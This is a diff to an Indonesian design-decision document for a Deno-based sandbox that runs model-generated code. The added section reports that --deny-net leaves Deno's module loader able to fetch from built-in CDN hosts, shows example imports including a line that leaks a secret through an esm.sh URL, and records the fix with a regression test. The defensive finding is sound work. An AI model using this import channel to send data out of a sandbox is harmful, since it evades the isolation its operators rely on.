@@ -16,6 +16,7 @@ ditulis dengan alasannya supaya tidak dibahas ulang dari nol.
 | Runtime sandbox L1 | **Deno** | Node + tsx + isolated-vm, Bun, workerd, subprocess Python, wasmtime/WASI |
 | Isolasi L2 (Fase 5) | **Docker** / LLM Sandbox | microsandbox, E2B self-hosted, gVisor, Firecracker |
 | Transport RPC | **stdio** | HTTP localhost, named pipe, unix socket, vsock |
+| Flag isolasi | `--no-remote --no-npm --deny-*` | `--deny-import` (tidak bekerja), `--cached-only` (lebih buruk) |
 | Framing | **JSON Lines bertipe** | MessagePack, JSON-RPC 2.0 penuh, protobuf |
 | Codegen | **manual, pluggable** | `json-schema-to-typescript`, datamodel-code-generator |
 | Package manager | **uv** | pip, poetry, pdm |
@@ -120,6 +121,38 @@ ke direktori preamble.
   pada error tidak cocok dan model akan "memperbaiki" hal yang salah.
 - **Permission deklaratif** — satu flag, bukan monkeypatch.
 - **Satu biner**, jalan native di Windows.
+
+### Temuan Fase 2: `--deny-net` TIDAK cukup
+
+Module loader Deno adalah **subsistem terpisah** dengan allow-list **bawaan**:
+
+```
+deno.land:443 · jsr.io:443 · esm.sh:443 · raw.esm.sh:443
+cdn.jsdelivr.net:443 · raw.githubusercontent.com:443
+gist.githubusercontent.com:443
+```
+
+Dengan `--deny-net` saja, ini **berhasil**:
+
+```ts
+await import("https://esm.sh/lodash");   // BERHASIL
+import x from "npm:lodash";               // mengunduh dari registry.npmjs.org
+```
+
+Itu kanal eksfiltrasi: URL-nya sendiri sudah membocorkan data
+(`import("https://esm.sh/x?d=" + rahasia)`), sekaligus jalan masuk kode arbitrer.
+
+Yang **tidak** memperbaikinya:
+- `--deny-import` — tidak menimpa allow-list bawaan. Bahkan
+  `--deny-import=esm.sh` tetap meloloskan.
+- `--cached-only` — **lebih buruk**: modul yang sudah ter-cache tetap lolos,
+  jadi hasilnya bergantung pada isi cache.
+
+Yang benar: **`--no-remote` + `--no-npm`**. Keduanya memblokir `https:`, `jsr:`,
+dan `npm:`, dan tidak mengganggu `data:` URL yang dipakai memuat kode model.
+
+Ada test regresi berparameter untuk kelima specifier di
+`tests/test_sandbox.py::test_import_remote_ditolak`.
 
 ### Batas yang harus jujur
 
